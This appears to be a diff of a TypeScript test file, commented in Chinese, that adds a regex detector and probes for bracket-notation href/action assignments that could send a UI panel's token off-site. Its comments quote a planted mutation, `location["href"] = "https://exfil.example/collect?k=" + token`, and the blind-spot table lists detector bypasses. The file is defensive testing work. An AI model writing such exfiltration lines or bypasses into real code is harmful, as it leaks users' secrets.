@@ -779,7 +779,8 @@ describe("面板的网络出口清单", () => {
  * `location.href = "https://exfil.example/collect?k=" + token;`，
  * 走完作者的正常流程（改文件 → `node scripts/build-ui.mjs` → 跑全量）之后
  * ⇒ **`pnpm test` 126 files / 2665 passed，十二道门禁一道都不吵。**
- * ⚠️ 中途单跑 `tests/unit/ui-assets.test.ts` 确实红过一次，**但它红在「生成物漂移」**
+ * ⚠️ 中途单跑 `tests/unit/ui-assets.test.ts` 的
+ * 「重新生成一遍，与仓库里那份逐字节相同」确实红过一次，**但它红在「生成物漂移」**
  * ——账本 `:465` 记的正是这个形状：「**门禁红了不等于门禁抓住了你以为的那件事**」。
  *
  * ── **今天这张表里的每一条，为什么长这个样子（逐条实测）** ──────────────────────
@@ -809,6 +810,20 @@ describe("面板的网络出口清单", () => {
  *   `step.action === "giveUp"` 与 `js/pure/playground.mjs` 的 `{ action: "giveUp" }`
  *   都不匹配（前者被 `(?!=)` 挡住，后者是 `action:` 不是 `.action =`）。
  *   ⚠️ **表单那一族今天另有 CSP `form-action 'none'` 兜着**，收它是第二层，不是唯一一层。
+ * · **方括号 + 字面量属性名被赋值**（`/\[\s*["'](?:href|action)\s*["']\s*\]\s*=(?!=)/`）
+ *   —— `el["href"] = u` / `location['href'] = u` / `node["action"] = u`。
+ *   ⚠️⚠️ **这一条是修复定向复评补进来的，补之前这一整族完整逃逸**：把
+ *   `location["href"] = "https://exfil.example/collect?k=" + token` 插进
+ *   `js/sec-playground.js` 再走完「改文件 → `build-ui` → 跑全量」，
+ *   **`pnpm test` 2716 全绿，一格没红**——形状与上一轮 `location.href = …`
+ *   被判 HIGH 的那次**逐字相同**，只是换了一种同样普通的写法。
+ *   ⚠️ **它当时也不在下面那张盲点表里**：盲点第 1 条写着「真正逃得掉的只有属性名本身
+ *   也被拼出来的那一种 —— 属于刻意绕开」，而 `["href"]` 的属性名是**普通字面量**、
+ *   零拼接、零绕开意图。**那句全称句是假的，已连同这一条一起改真。**
+ *   ⚠️ **点名两个属性名，不写成「任意属性名」**：`o["timeout"] = 5` 这类无关赋值
+ *   一个都不许被误红（反向控制那一组逐条钉着），而一道会误红的护栏过不了三轮就会被放宽。
+ *   `(?!=)` 照旧挡住 `o["href"] === x` 这种读取比较；`{ ["href"]: u }` 那种计算属性名
+ *   后面跟的是 `:` 不是 `=`，仍在盲点表里。
  */
 const NAV_EGRESS_FORMS: ReadonlyArray<{ label: string; re: RegExp }> = [
   { label: "href 被赋值（含 location.href / a.href / 别名）", re: /\.\s*href\s*=(?!=)/g },
@@ -819,6 +834,7 @@ const NAV_EGRESS_FORMS: ReadonlyArray<{ label: string; re: RegExp }> = [
   { label: "href: 属性字面量", re: /(?<![A-Za-z0-9_$-])href\s*:/g },
   { label: 'setAttribute("href"/"action")', re: /setAttribute\(\s*["'](?:href|action)["']/g },
   { label: "form 的 action 被赋值", re: /\.\s*action\s*=(?!=)/g },
+  { label: '方括号 + 字面量属性名被赋值（el["href"] = / location["href"] =）', re: /\[\s*["'](?:href|action)["']\s*\]\s*=(?!=)/g },
 ];
 
 /** 一段源码里的**导航出口**处数。**注释与模板串字面文本都不算**（与取数那道共用 `codeOnly()`）。 */
@@ -841,12 +857,36 @@ function navEgressSites(src: string): number {
 const NAV_BLIND_SPOTS: ReadonlyArray<{ probe: string; why: string }> = [
   {
     probe: 'const p = "hr" + "ef"; window.location[p] = u;',
-    why: "**被写的那一格是拼出来的时扫不到**（`window.location[p] = u`）。"
+    why: "**属性名是运行期拼出来 / 从变量来的时扫不到**（`window.location[p] = u`）。"
       + "⚠️ **注意射程比想的宽一点，别把这条读大了**：`href` 那条规则落在「`href` 这一格被写」上、"
       + "不落在接收者叫什么，所以**接收者**拼出来是抓得住的"
       + "（`window[k].href = u` 实测被数出来 1，这也是它进不了本表的原因）。"
-      + "真正逃得掉的只有**属性名本身**也被拼出来的那一种 —— **属于刻意绕开**，"
-      + "本来就不在一道文本扫描的射程里，与取数那张表的 `globalThis[\"fetch\"]` 是同一条天花板。",
+      + "⚠️⚠️ **上一版这里写的是「真正逃得掉的只有属性名本身也被拼出来的那一种 —— 属于刻意绕开」，"
+      + "那是一句被实测证伪的全称句**：当时 `el[\"href\"] = u` / `location[\"href\"] = u` "
+      + "（属性名是**普通字面量**，零拼接、零绕开意图）**整族逃得掉**，"
+      + "而把 `location[\"href\"] = \"https://…?k=\" + token` 插进 `js/sec-playground.js` "
+      + "走完正常流程之后 `pnpm test` 2716 全绿。⇒ 那一族已经补进上面那张表，"
+      + "**这一条的射程随之缩回「属性名不是字面量」这一种**。"
+      + "与取数那张表的 `globalThis[\"fetch\"]` 是同一条天花板。",
+  },
+  {
+    probe: "const el = a; el[`href`] = u; el.setAttribute(`action`, u);",
+    why: "**属性名写成模板串时扫不到**：`codeOnly()` 会把模板串的**字面文本**抠掉"
+      + "（那一步是为了让注释与文案不误报），`href` / `action` 这几个字随之消失，"
+      + "上面两条认字面量的规则都打不到。"
+      + "⚠️ **这条是「实现代价」不是「刻意绕开」**：要认它得让 `codeOnly()` 区分"
+      + "「模板串里的字面文本」与「模板串当属性名用」，而那是两道扫描共用的那一份，"
+      + "改坏一次两道一起变瞎。**今天登记，不今天补**（与下面那条取值用法同一条裁定）。",
+  },
+  {
+    probe: 'location.href += "?k=" + t;',
+    why: "**复合赋值（`+=`）扫不到**：上面几条都要求 `=` 前面不是别的运算符"
+      + "（`(?!=)` 只挡 `==`，而 `+=` 是 `+` 在前，`\\s*=` 根本走不到）。"
+      + "⚠️ **危害档位明写，别把它读成与直接赋值同级**：`+=` 只能把东西**拼在当前那条"
+      + "URL 后面**，而当前那条 URL 恒是面板自己（同源）⇒ 它送不到外站去，"
+      + "只会把口令写进自己的地址栏与 referrer。"
+      + "⚠️ 收它的代价是把 `=(?!=)` 放宽成一族运算符，而那正是最容易写反的地方"
+      + "（本仓那张取数表上记着写反两次的后果）。**今天登记，不今天补。**",
   },
   {
     probe: "const go = location.assign; go(u);",
@@ -858,8 +898,15 @@ const NAV_BLIND_SPOTS: ReadonlyArray<{ probe: string; why: string }> = [
       + "收益是一种没人这么写的形态。**今天登记，不今天补。**",
   },
   {
-    probe: 'el("a", { ["href"]: u });',
-    why: "**计算属性名扫不到**：`href:` 那条是词法钩子，只认写死在那里的名字。"
+    probe: 'el("a", { ["href"]: u, "action": u });',
+    why: "**对象字面量里的属性名一旦不是「裸 `href`」就扫不到**：`href:` 那条是词法钩子，"
+      + "只认 `href` 后面**紧跟冒号**的形态 ⇒ 计算属性名（`[\"href\"]:`）与"
+      + "**带引号的键**（`\"href\":`）两种都逃得掉。"
+      + "⚠️ **带引号那一种是写这一轮反向控制时顺手实测出来的，之前没人登记过**"
+      + "（本来打算把它当成「会被 `href:` 数到」的反向控制写下去，一跑才发现是 0）"
+      + "——**这就是「先种一次最自然的绕法再落笔」买到的东西**。"
+      + "⚠️ 上面新补的方括号那条管的是**赋值**（`]` 后面跟 `=`），"
+      + "这两种后面跟的是 `:`，不在它射程里。"
       + "与 `tests/ui/dom/playground-section.test.ts` 的 `classKeySites()` 登记的"
       + "是同一条边界（那边实测过 `el(\"p\", { [K]: … })` 逃得掉）。",
   },
@@ -948,6 +995,12 @@ describe("面板的导航出口清单（CSP 拦不住的那一族）", () => {
     ['node.setAttribute("href", u);', 1, "字面量属性名的另一条路"],
     ['node.setAttribute("action", u);', 1, "表单那一条同理"],
     ["form.action = u;", 1, "表单地址被改写（CSP form-action 'none' 是第二层，不是唯一一层）"],
+    // ── 方括号 + 字面量属性名这一族（修复定向复评 H3：补之前整族逃逸，实测 2716 全绿）──
+    ['el["href"] = u;', 1, "方括号 + 双引号属性名 —— 复评当场种进 sec-playground.js 的就是这个形状"],
+    ["el['href'] = u;", 1, "同上，单引号"],
+    ['location["href"] = u;', 1, "复评那条变异逐字就是它（拼上 token 再跳外站）"],
+    ['node["action"] = u;', 1, "表单那一条同理"],
+    ['el[ "href" ] = u;', 1, "方括号内外的空白不许把它漏过去"],
   ])("正向自检：这一种写法真的被数出来：%s", (probe, expected) => {
     expect(navEgressSites(probe as string)).toBe(expected as number);
   });
@@ -979,6 +1032,13 @@ describe("面板的导航出口清单（CSP 拦不住的那一族）", () => {
     ["x.hrefValue = 1;", 0, "href 是另一个属性名的前缀"],
     ["if (a.href === b.href) return;", 0, "两边都是读，=== 不许被当成赋值"],
     ["const hasAction = o.action !== undefined;", 0, "!== 同样不是赋值"],
+    // ── 方括号那一族的反向控制（**它才是这条新规则能不能活下来的那一格**）──────────
+    // 一道会因为「有人写了 `cfg["timeout"] = 5`」而变红的护栏，过不了三轮就会被放宽。
+    ['if (o["href"] === x) return;', 0, "方括号读取 + === ：读不是写"],
+    ['const u = o["href"];', 0, "方括号纯读取"],
+    ['cfg["timeout"] = 5;', 0, "别的属性名：方括号赋值本身不是出口，只有 href/action 才是"],
+    ['el["className"] = c;', 0, "同上，一个字面量属性名赋值的普通写法"],
+    ['if (m["action"] !== "go") return;', 0, "!== 同样不是赋值"],
   ])("反向控制：这一种合法写法不许被数成出口：%s", (probe, expected) => {
     expect(navEgressSites(probe as string)).toBe(expected as number);
   });
